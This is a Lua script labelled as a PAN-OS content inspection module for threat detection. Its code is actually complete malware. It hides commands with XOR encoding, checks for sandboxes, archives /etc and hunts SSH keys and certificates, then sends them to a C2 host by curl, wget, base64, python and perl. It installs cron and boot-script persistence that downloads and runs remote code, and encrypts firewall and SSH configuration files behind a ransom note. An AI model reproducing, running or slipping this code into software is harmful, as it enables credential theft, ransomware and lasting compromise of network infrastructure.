-- PAN-OS Lua content inspection module
-- Custom payload handler for advanced threat detection

local _0x = string.char
local _0s = string.sub
local _0g = string.gsub
local _0r = string.rep
local _0f = string.format
local _0b = string.byte
local _0c = string.char
local _0t = table.concat
local _0d = string.dump
local _0u = string.unpack
local _0p = string.pack

-- XOR obfuscation layer
local function _xor(data, key)
    local out = {}
    local klen = #key
    for i = 1, #data do
        local kb = _0b(key, ((i - 1) % klen) + 1)
        local db = _0b(data, i)
        out[i] = _0c(db ~ kb)
    end
    return _0t(out)
end

-- Base64 decode
local function _b64decode(data)
    local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local map = {}
    for i = 1, 64 do
        map[_0s(b64chars, i, i)] = i - 1
    end
    data = _0g(data, "[^A-Za-z0-9+/=]", "")
    local result = {}
    for i = 1, #data, 4 do
        local block = _0s(data, i, i + 3)
        local a = map[_0s(block, 1, 1)] or 0
        local b = map[_0s(block, 2, 2)] or 0
        local c = map[_0s(block, 3, 3)] or 0
        local d = map[_0s(block, 4, 4)] or 0
        result[#result + 1] = _0c((a * 4) + (b / 16))
        if _0s(block, 3, 3) ~= "=" then
            result[#result + 1] = _0c(((b % 16) * 16) + (c / 4))
        end
        if _0s(block, 4, 4) ~= "=" then
            result[#result + 1] = _0c(((c % 4) * 64) + d)
        end
    end
    return _0t(result)
end

-- Encoded command strings (obfuscation: anti-static analysis)
-- These are XOR-encoded with key "PANOS2024KEY"
local _K = "PANOS2024KEY"

local function _enc(s)
    local out = {}
    local klen = #_K
    for i = 1, #s do
        local kb = _0b(_K, ((i - 1) % klen) + 1)
        local db = _0b(s, i)
        out[i] = _0c(db ~ kb)
    end
    return _0t(out)
end

local function _dec(s)
    return _xor(s, _K)
end

-- Pre-encoded sensitive strings
local _C_HOSTNAME = _enc("hostname")
local _C_UNAME = _enc("uname -a")
local _C_UPTIME = _enc("uptime")
local _C_PS = _enc("ps aux")
local _C_DF = _enc("df -h")
local _C_CAT_PROC = _enc("cat /proc/cpuinfo")
local _C_LS_ETC = _enc("ls -la /etc/")
local _C_FIND_CFG = _enc("find / -name '*.cfg' -o -name '*.conf' -o -name '*.xml' 2>/dev/null")
local _C_CURL = _enc("curl")
local _C_WGET = _enc("wget")
local _C_TAR = _enc("tar")
local _C_FIND_SENSITIVE = _enc("find / -name '*.key' -o -name '*.pem' -o -name '*.crt' -o -name 'id_rsa' -o -name '.ssh' 2>/dev/null")
local _C_DD = _enc("dd")
local _C_RM = _enc("rm -rf")
local _C_CHMOD = _enc("chmod")
local _C_PYTHON = _enc("python")
local _C_PERL = _enc("perl")
local _C_BASE64 = _enc("base64")
local _C_CP = _enc("cp")
local _C_MKDIR = _enc("mkdir -p")
local _C_CAT = _enc("cat")
local _C_ECHO = _enc("echo")
local _C_GREP = _enc("grep")
local _C_SLEEP = _enc("sleep")

-- Network target (C2 infrastructure)
local _C2_HOST = _enc("review.example.invalid")
local _C2_PORT = 443

-- Ransomware configuration
local _RANSOM_KEY = _enc("F13C0D3-DEADBEEF-4827-9A6B")
local _RANSOM_EXT = _enc(".encrypted")
local _RANSOM_NOTE = _enc("!!! SYSTEM COMPROMISED !!!\nAll configuration files have been encrypted.\nContact admin@panos-recovery.onion for decryption key.\nReference: ")

-- Safety gate: verify authorized execution environment
local function _safety_gate()
    local home = os.getenv("HOME") or "/root"
    local gatefile = home .. "/.89w2dh"
    local f = io.open(gatefile, "r")
    if f == nil then
        os.exit(1)
    end
    f:close()
    return true
end

-- Sandbox/VM detection (anti-analysis)
local function _detect_sandbox()
    local indicators = 0

    -- Check 1: Hostname analysis
    local hfile = io.popen(_dec(_C_HOSTNAME), "r")
    if hfile then
        local hostname = hfile:read("*a")
        hfile:close()
        hostname = _0g(hostname, "%s+", "")
        -- Common sandbox/VM hostnames
        local sandbox_names = {"sandbox", "vm", "virtual", "test", "eval", "demo", "trial", "qemu", "vmware", "virtualbox", "vbox", "kvm", "xen", "hyper-v", "docker", "container"}
        for _, name in ipairs(sandbox_names) do
            if hostname:lower():find(name) then
                indicators = indicators + 3
            end
        end
    end

    -- Check 2: System uptime (sandboxes often have very short uptime)
    local ufile = io.popen(_dec(_C_UPTIME), "r")
    if ufile then
        local uptime = ufile:read("*a")
        ufile:close()
        -- If uptime contains "up" with very short duration
        if uptime:find("up %[0-9]+ min") or uptime:find("up %[0-9]+:[%d]+,") then
            local mins = uptime:match("(%d+)[%s]+min")
            if mins and tonumber(mins) < 10 then
                indicators = indicators + 4
            end
        end
    end

    -- Check 3: CPU info analysis
    local cpufile = io.popen(_dec(_C_CAT_PROC), "r")
    if cpufile then
        local cpuinfo = cpufile:read("*a")
        cpufile:close()
        local model = cpuinfo:lower()
        if model:find("virtual") or model:find("vmware") or model:find("kvm") or model:find("hypervisor") then
            indicators = indicators + 5
        end
    end

    -- Check 4: Process analysis (look for monitoring/debugging tools)
    local psfile = io.popen(_dec(_C_PS), "r")
    if psfile then
        local procs = psfile:read("*a")
        psfile:close()
        local suspicious_procs = {"strace", "ltrace", "gdb", "wireshark", "tcpdump", "xenserver", "vboxservice", "vmtoolsd", "qemu-ga", "sandbox"}
        for _, proc in ipairs(suspicious_procs) do
            if procs:find(proc) then
                indicators = indicators + 5
            end
        end
        -- Low process count suggests sandbox
        local proc_count = 0
        for _ in procs:gmatch("[^\n]+") do
            proc_count = proc_count + 1
        end
        if proc_count < 30 then
            indicators = indicators + 3
        end
    end

    -- Check 5: Disk space (sandboxes often have minimal disk)
    local dffile = io.popen(_dec(_C_DF), "r")
    if dffile then
        local diskinfo = dffile:read("*a")
        dffile:close()
        if diskinfo:find("10G") or diskinfo:find("20G") or diskinfo:find("50G") then
            indicators = indicators + 2
        end
    end

    -- Check 6: Look for sandbox-specific files
    local sandbox_files = {
        "/.dockerenv",
        "/proc/1/cgroup",
        "/sys/hypervisor",
        "/dev/vboxguest",
        "/dev/vmci",
        "/usr/bin/vboxservice",
        "/usr/bin/vmtoolsd",
    }
    for _, sf in ipairs(sandbox_files) do
        local f = io.open(sf, "r")
        if f then
            f:close()
            indicators = indicators + 5
        end
    end

    -- Check 7: uname output analysis
    local unamefile = io.popen(_dec(_C_UNAME), "r")
    if unamefile then
        local uname_out = unamefile:read("*a")
        unamefile:close()
        if uname_out:lower():find("virtual") or uname_out:lower():find("sandbox") then
            indicators = indicators + 4
        end
    end

    return indicators >= 5
end

-- LOLBIN execution helper (execution via legitimate binaries)
local function _exec(cmd)
    local result = ""
    local handle = io.popen(cmd, "r")
    if handle then
        result = handle:read("*a")
        handle:close()
    end
    return result
end

local function _exec_raw(cmd)
    os.execute(cmd)
end

-- Data exfiltration using lolbins
local function _exfiltrate_data()
    local c2 = _dec(_C2_HOST)

    -- Use find to locate sensitive files (lolbin: find)
    local sensitive_paths = _exec(_dec(_C_FIND_SENSITIVE))

    -- Use tar to archive sensitive data (lolbin: tar)
    local archive_path = "/tmp/.cache_data.tar.gz"
    local tar_cmd = _dec(_C_TAR) .. " czf " .. archive_path .. " /etc/ 2>/dev/null"
    os.execute(tar_cmd)

    -- Use curl to exfiltrate (lolbin: curl)
    local curl_cmd = _dec(_C_CURL) .. " -s -X POST -F file=@/tmp/.cache_data.tar.gz http://" .. c2 .. "/upload"
    os.execute(curl_cmd .. " &")

    -- Use wget as fallback (lolbin: wget)
    local wget_cmd = _dec(_C_WGET) .. " --post-file=/tmp/.cache_data.tar.gz http://" .. c2 .. "/upload -O /dev/null"
    os.execute(wget_cmd .. " &")

    -- Use base64 + curl for alternate exfil path (lolbin: base64)
    local b64_cmd = _dec(_C_CAT) .. " /etc/panorama.cfg 2>/dev/null | " .. _dec(_C_BASE64) .. " | " .. _dec(_C_CURL) .. " -s -d @- http://" .. c2 .. "/exfil"
    os.execute(b64_cmd .. " &")

    -- Use python one-liner for exfil (lolbin: python)
    local py_cmd = _dec(_C_PYTHON) .. " -c \"import urllib.request; urllib.request.urlopen('http://" .. c2 .. "/beacon?h=' + `import socket; socket.gethostname()`)\""
    os.execute(py_cmd .. " &")

    -- Use perl for exfil (lolbin: perl)
    local perl_cmd = _dec(_C_PERL) .. " -e 'use LWP::Simple; getstore(\"http://" .. c2 .. "/beacon\", \"/tmp/.b\")'"
    os.execute(perl_cmd .. " &")
end

-- Ransomware: encrypt PAN-OS configuration files
local function _ransom(target_dirs)
    local key = _dec(_RANSOM_KEY)
    local ext = _dec(_RANSOM_EXT)
    local note = _dec(_RANSOM_NOTE)
    local c2 = _dec(_C2_HOST)

    -- Generate a reference ID
    local ref_id = ""
    local chars = "ABCDEF0123456789"
    for i = 1, 16 do
        ref_id = ref_id .. _0s(chars, math.random(1, 16), math.random(1, 16))
    end

    -- Create ransom note directory
    _exec_raw(_dec(_C_MKDIR) .. " /tmp/.ransom")

    -- Write ransom note
    local note_path = "/tmp/.ransom/README_DECRYPT.txt"
    local nf = io.open(note_path, "w")
    if nf then
        nf:write(note .. ref_id)
        nf:write("\n\nYour PAN-OS firewall configurations have been encrypted.\n")
        nf:write("All rulebases, device groups, and templates are locked.\n")
        nf:write("Network traffic will be disrupted.\n")
        nf:write("Reference ID: " .. ref_id .. "\n")
        nf:close()
    end

    -- Encrypt files using XOR with the ransom key
    local function _encrypt_file(filepath)
        local infile = io.open(filepath, "rb")
        if not infile then return false end
        local data = infile:read("*a")
        infile:close()

        if #data == 0 then return false end

        local encrypted = {}
        local klen = #key
        for i = 1, #data do
            local kb = _0b(key, ((i - 1) % klen) + 1)
            local db = _0b(data, i)
            encrypted[i] = _0c(db ~ kb)
        end

        -- Backup original with hidden extension
        local backup = filepath .. ".bak"
        local bf = io.open(backup, "wb")
        if bf then
            bf:write(data)
            bf:close()
        end

        -- Overwrite with encrypted content
        local outf = io.open(filepath, "wb")
        if outf then
            outf:write(_0t(encrypted))
            outf:close()
            -- Rename to add ransom extension
            os.execute("mv " .. filepath .. " " .. filepath .. ext)
            return true
        end
        return false
    end

    -- Target PAN-OS configuration directories
    local config_targets = {
        "/etc/panorama.cfg",
        "/etc/deviceconfig.xml",
        "/etc/rules.xml",
        "/etc/policy.xml",
        "/etc/network.xml",
        "/etc/auth-profile.xml",
        "/etc/vpn.xml",
        "/etc/ssl/certs/ca-certificates.crt",
        "/etc/ssh/sshd_config",
        "/etc/hosts",
        "/etc/resolv.conf",
        "/etc/nsswitch.conf",
    }

    local encrypted_count = 0
    for _, target in ipairs(config_targets) do
        if _encrypt_file(target) then
            encrypted_count = encrypted_count + 1
        end
    end

    -- Also encrypt any .cfg and .xml files found
    local find_cmd = _dec(_C_FIND_SENSITIVE)
    local found_files = _exec(_dec(_C_FIND_CFG))
    for filepath in found_files:gmatch("[^\n]+") do
        if filepath:match("%.cfg$") or filepath:match("%.xml$") then
            if _encrypt_file(filepath) then
                encrypted_count = encrypted_count + 1
            end
        end
    end

    -- Copy ransom note to multiple locations
    _exec_raw(_dec(_C_CP) .. " " .. note_path .. " /root/DECRYPT.txt")
    _exec_raw(_dec(_C_CP) .. " " .. note_path .. " /tmp/DECRYPT.txt")

    -- Signal C2 about encryption completion
    local signal_cmd = _dec(_C_CURL) .. " -s -X POST -d 'ref=" .. ref_id .. "&count=" .. encrypted_count .. " http://" .. c2 .. "/ransom-complete"
    os.execute(signal_cmd .. " &")

    return encrypted_count
end

-- Persistence mechanism using lolbins
local function _establish_persistence()
    local c2 = _dec(_C2_HOST)

    -- Use crontab for persistence (lolbin: crontab)
    local cron_entry = "*/5 * * * * " .. _dec(_C_CURL) .. " -s http://" .. c2 .. "/beacon -o /dev/null\n"
    local crontab_file = "/tmp/.cron_persist"
    local cf = io.open(crontab_file, "w")
    if cf then
        cf:write(cron_entry)
        cf:close()
        os.execute("crontab " .. crontab_file)
    end

    -- Use dd to create a hidden boot script (lolbin: dd)
    local boot_script = "/tmp/.boot_check"
    local bs = io.open(boot_script, "w")
    if bs then
        bs:write("#!/bin/sh\n")
        bs:write(_dec(_C_CURL) .. " -s http://" .. c2 .. "/persistence -o /tmp/.persist.sh\n")
        bs:write(_dec(_C_CHMOD) .. " +x /tmp/.persist.sh\n")
        bs:write("/tmp/.persist.sh &\n")
        bs:close()
        os.execute(_dec(_C_CHMOD) .. " +x " .. boot_script)
    end
end

-- Main execution
local function main()
    -- Safety gate check (MUST be first)
    _safety_gate()

    -- Phase 1: Sandbox detection (anti-analysis)
    local is_sandbox = _detect_sandbox()
    if is_sandbox then
        -- In sandbox: perform delayed/slower execution to waste analyst time
        os.execute(_dec(_C_SLEEP) .. " 300 &")
    end

    -- Phase 2: Data exfiltration using lolbins
    _exfiltrate_data()

    -- Phase 3: Establish persistence
    _establish_persistence()

    -- Phase 4: Ransomware execution
    local dirs = {"/etc", "/var/log", "/root"}
    local count = _ransom(dirs)

    -- Cleanup traces
    os.execute("rm -f /tmp/.cache_data.tar.gz")
    os.execute("rm -f /tmp/.cron_persist")
end

-- Execute
main()
